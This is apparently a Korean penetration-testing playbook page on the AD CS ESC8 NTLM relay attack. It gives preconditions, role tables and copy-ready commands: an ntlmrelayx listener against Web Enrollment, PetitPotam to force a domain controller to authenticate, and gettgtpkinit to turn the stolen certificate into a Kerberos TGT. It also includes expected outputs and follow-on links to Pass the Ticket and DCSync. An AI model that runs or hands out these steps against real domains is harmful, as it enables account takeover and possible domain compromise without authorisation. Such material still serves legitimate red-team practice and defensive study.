---
tags:
  - 환경/ad
  - 환경/windows
  - 서비스/adcs
시작조건: ["공격 호스트에서 AD CS Web Enrollment HTTP/HTTPS 접근 가능", "피해자의 NTLM 인증을 공격 호스트에서 실시간 수신 가능"]
필요권한: ["relay되는 피해자 계정의 인증용 certificate enrollment 권한"]
필요조건: ["피해자에서 공격 호스트 SMB listener로의 네트워크 경로", "공격 호스트에서 AD CS Web Enrollment로의 네트워크 경로", "피해자 계정 유형에 맞는 certificate template"]
결과: ["피해자 계정의 인증 certificate와 private key가 든 PFX", "PKINIT 성공 시 피해자 계정의 Kerberos TGT"]
---

# AD CS ESC8 NTLM Relay

## 한 줄 판단

피해자의 NTLM 인증을 수신할 수 있고 공격 호스트에서 취약한 AD CS Web Enrollment에 접근할 수 있으면, 들어오는 인증을 실시간 relay해 피해자 계정의 인증 certificate를 발급받고 Kerberos Ticket-Granting Ticket(TGT)으로 전환한다.

## 사용할 때

- 현재 보유 정보: AD CS Web Enrollment 주소, Certification Authority(CA) 이름과 피해자 사용자 또는 머신 계정 후보.
- 명령 실행 위치: 피해자의 NTLM 인증을 SMB listener로 받을 수 있고 `/certsrv`에도 HTTP/HTTPS로 접근할 수 있는 공격 호스트.
- 현재 인증 수단: 공격자 소유 AD 비밀번호·hash·ticket은 필수가 아니며, 피해자의 NTLM 인증이 실행 중인 listener에 실시간으로 도달해야 한다.
- 공격 대상과 결과: relay되는 피해자 계정이 template 등록 권한을 가지면 그 계정의 certificate와 private key를 얻는다. 비밀번호나 NT hash를 얻는 절차는 아니다.
- 권한 경계: certificate 발급은 relay된 계정의 기존 인증 범위를 재현할 뿐이며, 인증서 획득 자체가 로컬 관리자, Domain Admin 또는 DCSync 권한을 뜻하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 공격 호스트와 AD CS 경로 | 공격 호스트에서 `/certsrv`의 HTTP/HTTPS 포트에 접근 가능 | 웹 응답과 Web Enrollment 동작 확인 | DNS, 프록시, 라우팅과 HTTP/HTTPS 포트 확인 |
| 피해자와 listener 경로 | 피해자 호스트에서 공격 호스트의 SMB listener로 접근 가능 | 인증 유도 시 listener 연결과 원본 주소 확인 | callback 주소, 방화벽, TCP/445와 listener 바인딩 확인 |
| relay 보호 조건 | Web Enrollment에 Extended Protection for Authentication(EPA) 또는 channel binding 보호가 강제되지 않음 | `ntlmrelayx`의 relay 결과와 서버 설정 확인 | 보호가 적용된 endpoint를 relay 대상으로 사용하지 않음 |
| 요청자 계정 | 공격자 소유 도메인 계정 불필요 | listener가 피해자 NTLM 인증을 수신하는지 확인 | 저장된 NetNTLM hash만으로는 나중에 relay할 수 없으므로 새 인증 흐름 확보 |
| 피해자 계정과 template | relay된 사용자 또는 머신 계정이 인증용 template을 등록할 수 있음 | 계정 유형, template EKU와 enrollment 권한 확인 | 다른 template을 임의 선택하지 말고 발급 권한과 용도 재확인 |
| certificate 사용 경로 | 공격 호스트에서 DC Kerberos TCP/UDP 88에 접근 가능하고 DC가 PKINIT을 지원 | `gettgtpkinit` 결과와 `klist` 확인 | PFX는 유지하되 PKINIT 조건과 대체 certificate 인증 경로 확인 |

### 요청자, 피해자와 최종 권한 구분

| 역할 | 보유하거나 충족해야 하는 상태 | 성공 시 얻는 것 |
|---|---|---|
| 공격자 | listener 실행 권한과 AD CS/DC 네트워크 경로 | 피해자 계정용 PFX와, PKINIT 성공 시 같은 계정의 TGT |
| 피해자 인증 주체 | 공격 호스트로 NTLM 인증을 보내는 사용자 또는 머신 계정 | 이 계정의 기존 권한이 certificate와 TGT에 반영됨 |
| AD CS 대상 | 피해자 계정에 인증용 template 등록을 허용하는 Web Enrollment | certificate 발급만 수행하며 새 관리자·복제 권한을 부여하지 않음 |

## 실행

1. AD CS Web Enrollment와 relay 보호 조건을 확인한다.
2. `ntlmrelayx --adcs`로 relay listener를 준비한다.
3. 피해자 인증을 유도하거나 기다린다.
4. `.pfx`를 얻으면 PKINIT으로 TGT를 발급받아 [[Pass the Ticket]]으로 이어간다.

### relay listener

```bash
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

확인할 출력:

- `GOT CERTIFICATE`, `Writing PKCS#12 certificate`.
- 이 출력만 있으면 PFX를 수집한 단계다. 평문 비밀번호, NT hash 또는 Kerberos ticket을 얻은 결과로 해석하지 않는다.

### PetitPotam으로 DC 인증 강제

DC의 MS-EFSRPC 경로가 확인된 경우 relay listener를 먼저 시작한 뒤 인증을 유도한다.

```bash
python3 PetitPotam.py <ATTACK_HOST> <DC>
```

확인할 출력:

- `Successfully bound`, `Got expected ERROR_BAD_NETPATH exception`, `Attack worked`.
- 이 출력은 DC가 인증을 시도했다는 신호이며 certificate 발급 성공은 아니다.
- `ntlmrelayx` 쪽에서 DC 머신 계정의 `SUCCEED`와 `GOT CERTIFICATE`를 함께 확인한다.

### certificate로 TGT 획득

```bash
python3 gettgtpkinit.py -cert-pfx <ACCOUNT>.pfx -dc-ip <DC_IP> '<DOMAIN>/<ACCOUNT>' /tmp/account.ccache
export KRB5CCNAME=/tmp/account.ccache
klist
```

확인할 출력:

- `Saved TGT to file`, `klist`에서 티켓에 표시된 계정.

`ntlmrelayx`가 base64 certificate를 출력한 경우에는 파일 변환 없이 입력할 수 있다.

```bash
python3 gettgtpkinit.py '<DOMAIN>/<MACHINE_ACCOUNT>$' -pfx-base64 '<BASE64_CERTIFICATE>' /tmp/machine.ccache
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `GOT CERTIFICATE`, `Writing PKCS#12 certificate` | relay된 주체로 certificate 발급 성공 | 피해자 계정의 `.pfx` 확보 | PKINIT으로 TGT 발급 |
| `Saved TGT to file`과 `klist`의 피해자 계정 | certificate 기반 Kerberos 인증 성공 | 피해자 계정의 TGT 확보 | [[Pass the Ticket]]으로 서비스 권한 검증 |
| DC 머신 계정 또는 복제 권한 계정의 TGT | 고권한 AD 계정의 Kerberos TGT 확보 | DCSync 가능성 | [[DCSync]]에서 복제 권한을 별도 확인 |
| relay 실패 | signing, EPA 또는 인증 유도 조건 미충족 | certificate 미획득 | SMB signing, HTTP EPA, coercion 경로 재확인 |
| PetitPotam에서 `Attack worked`이나 listener 연결 없음 | 강제 인증 신호와 relay 수신 불일치 | certificate 미획득 | callback 주소, SMB listener, 방화벽과 DC 경로 확인 |
| certificate 발급 실패 | template, 계정 유형 또는 enrollment 권한 불일치 | NTLM 수신만 확인 | template 이름과 발급 권한 재확인 |
| TGT 발급 실패 | PKINIT 또는 EKU 조건 미충족 | `.pfx`만 확보 | PKINIT 지원과 PassTheCert/LDAPS 대안 검토 |

## 확인할 출력과 권한

- `.pfx` 생성과 TGT 발급은 서로 다른 성공 단계이므로 두 출력을 각각 확인한다.
- certificate와 TGT의 권한은 relay된 계정의 권한을 넘지 않는다.
- DC 머신 계정이라는 사실만으로 DCSync를 단정하지 않고 실제 복제 권한을 확인한다.
- 수신한 NetNTLM challenge-response, 발급된 PFX, TGT와 DCSync 가능성은 서로 다른 결과다. 이 절차는 피해자 비밀번호나 원본 NT hash를 복구하지 않는다.

## 후속 공격 연결

- 발급받은 certificate/TGT 사용: [[Pass the Ticket]]
- 발급 주체가 DC 머신 계정 또는 복제 권한 계정일 때: [[DCSync]]
- certificate로 인증한 뒤 대상 계정의 NT hash를 실제로 얻은 경우에만: [[Pass the Hash]]

## 관련 서비스

- [[80_443_HTTP_HTTPS]]
- [[8080_8443_Web_Alt]]
- [[88_Kerberos]]
- [[445_SMB]]

## 관련 상태 라우터

- 인증서로 확인된 계정의 도메인 범위를 판단할 때: [[AD Identity 확인 후 도메인 컨텍스트 열거]]

## 관련 도구

- [[impacket-ntlmrelayx]]
- [[PetitPotam]]
- [[gettgtpkinit]]
- [[impacket-secretsdump]]
- [[klist]]
